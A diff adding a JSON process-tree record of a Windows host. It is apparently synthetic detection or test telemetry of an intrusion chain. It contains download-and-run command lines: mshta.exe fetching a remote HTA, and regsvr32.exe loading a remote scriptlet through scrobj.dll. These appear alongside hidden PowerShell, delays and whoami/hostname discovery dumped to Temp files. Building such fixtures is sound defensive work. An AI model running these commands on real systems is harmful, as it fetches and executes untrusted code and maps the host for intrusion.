@@ -1,0 +1,227 @@
+{
+  "pid": 225305,
+  "ppid": 0,
+  "name": "services.exe",
+  "command": "services.exe -k netsvcs",
+  "children": [
+    {
+      "pid": 225310,
+      "ppid": 225305,
+      "name": "cscript.exe",
+      "command": "cscript.exe //nologo \"C:\\Users\\farhan.singh\\AppData\\Local\\Temp\\Deploy_06697f01.wsf\" /quiet",
+      "children": [
+        {
+          "pid": 225317,
+          "ppid": 225310,
+          "name": "ping.exe",
+          "command": "ping.exe -n 26 127.0.0.1 > nul",
+          "children": [
+            {
+              "pid": 225321,
+              "ppid": 225317,
+              "name": "mshta.exe",
+              "command": "mshta.exe \"http://pkirelay.corp.local/diag/collect.hta\"",
+              "children": [
+                {
+                  "pid": 225327,
+                  "ppid": 225321,
+                  "name": "hostname.exe",
+                  "command": "hostname.exe",
+                  "children": [
+                    {
+                      "pid": 225328,
+                      "ppid": 225327,
+                      "name": "whoami.exe",
+                      "command": "whoami.exe /priv",
+                      "children": [
+                        {
+                          "pid": 225334,
+                          "ppid": 225328,
+                          "name": "hostname.exe",
+                          "command": "hostname.exe > \"C:\\Users\\farhan.singh\\AppData\\Local\\Temp\\host_ff071a38.txt\"",
+                          "children": [
+                            {
+                              "pid": 225337,
+                              "ppid": 225334,
+                              "name": "hostname.exe",
+                              "command": "hostname.exe > \"C:\\Users\\farhan.singh\\AppData\\Local\\Temp\\host_15002b92.txt\"",
+                              "children": [
+                                {
+                                  "pid": 225338,
+                                  "ppid": 225337,
+                                  "name": "ping.exe",
+                                  "command": "ping.exe -n 24 127.0.0.1 > nul",
+                                  "children": [
+                                    {
+                                      "pid": 225343,
+                                      "ppid": 225338,
+                                      "name": "whoami.exe",
+                                      "command": "whoami.exe /all > \"C:\\Users\\farhan.singh\\AppData\\Local\\Temp\\who_b20ad28a.txt\"",
+                                      "children": []
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        },
+                        {
+                          "pid": 225346,
+                          "ppid": 225328,
+                          "name": "regsvr32.exe",
+                          "command": "regsvr32.exe /s /n /u /i:\"http://cdn.contoso-updates.com/diag/collect.sct\" scrobj.dll",
+                          "children": [
+                            {
+                              "pid": 225350,
+                              "ppid": 225346,
+                              "name": "whoami.exe",
+                              "command": "whoami.exe /groups",
+                              "children": [
+                                {
+                                  "pid": 225354,
+                                  "ppid": 225350,
+                                  "name": "hostname.exe",
+                                  "command": "hostname.exe > \"C:\\Users\\farhan.singh\\AppData\\Local\\Temp\\host_637573f6.txt\"",
+                                  "children": [
+                                    {
+                                      "pid": 225370,
+                                      "ppid": 225354,
+                                      "name": "hostname.exe",
+                                      "command": "hostname.exe > \"C:\\Users\\farhan.singh\\AppData\\Local\\Temp\\host_59cb0978.txt\"",
+                                      "children": [
+                                        {
+                                          "pid": 225376,
+                                          "ppid": 225370,
+                                          "name": "findstr.exe",
+                                          "command": "findstr.exe /i \"task\" \"C:\\ProgramData\\Contoso\\Logs\\support.log\"",
+                                          "children": [
+                                            {
+                                              "pid": 225388,
+                                              "ppid": 225376,
+                                              "name": "powershell.exe",
+                                              "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 7\"",
+                                              "children": [
+                                                {
+                                                  "pid": 225394,
+                                                  "ppid": 225388,
+                                                  "name": "hostname.exe",
+                                                  "command": "hostname.exe > \"C:\\Users\\farhan.singh\\AppData\\Local\\Temp\\host_585f99e1.txt\"",
+                                                  "children": [
+                                                    {
+                                                      "pid": 225403,
+                                                      "ppid": 225394,
+                                                      "name": "choice.exe",
+                                                      "command": "choice.exe /d y /t 23 > nul",
+                                                      "children": [
+                                                        {
+                                                          "pid": 225408,
+                                                          "ppid": 225403,
+                                                          "name": "powershell.exe",
+                                                          "command": "powershell.exe -WindowStyle Minimized -Command \"Get-Service | Out-File 'C:\\Users\\farhan.singh\\AppData\\Local\\Temp\\inv_5c4855f4.txt'\"",
+                                                          "children": [
+                                                            {
+                                                              "pid": 225411,
+                                                              "ppid": 225408,
+                                                              "name": "ping.exe",
+                                                              "command": "ping.exe -n 23 127.0.0.1 > nul",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 225414,
+                                                                  "ppid": 225411,
+                                                                  "name": "hostname.exe",
+                                                                  "command": "hostname.exe > \"C:\\Users\\farhan.singh\\AppData\\Local\\Temp\\host_0c8c5288.txt\"",
+                                                                  "children": []
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 225360,
+      "ppid": 225305,
+      "name": "timeout.exe",
+      "command": "timeout.exe /t 16 /nobreak",
+      "children": [
+        {
+          "pid": 225361,
+          "ppid": 225360,
+          "name": "timeout.exe",
+          "command": "timeout.exe /t 23 /nobreak",
+          "children": [
+            {
+              "pid": 225362,
+              "ppid": 225361,
+              "name": "whoami.exe",
+              "command": "whoami.exe /all > \"C:\\Users\\farhan.singh\\AppData\\Local\\Temp\\who_f66444df.txt\"",
+              "children": [
+                {
+                  "pid": 225367,
+                  "ppid": 225362,
+                  "name": "whoami.exe",
+                  "command": "whoami.exe",
+                  "children": []
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 225379,
+      "ppid": 225305,
+      "name": "whoami.exe",
+      "command": "whoami.exe /all",
+      "children": [
+        {
+          "pid": 225382,
+          "ppid": 225379,
+          "name": "hostname.exe",
+          "command": "hostname.exe",
+          "children": []
+        }
+      ]
+    },
+    {
+      "pid": 225398,
+      "ppid": 225305,
+      "name": "hostname.exe",
+      "command": "hostname.exe > \"C:\\Users\\farhan.singh\\AppData\\Local\\Temp\\host_96e5186c.txt\"",
+      "children": [
+        {
+          "pid": 225401,
+          "ppid": 225398,
+          "name": "timeout.exe",
+          "command": "timeout.exe /t 25 /nobreak",
+          "children": []
+        }
+      ]
+    }
+  ]
+}
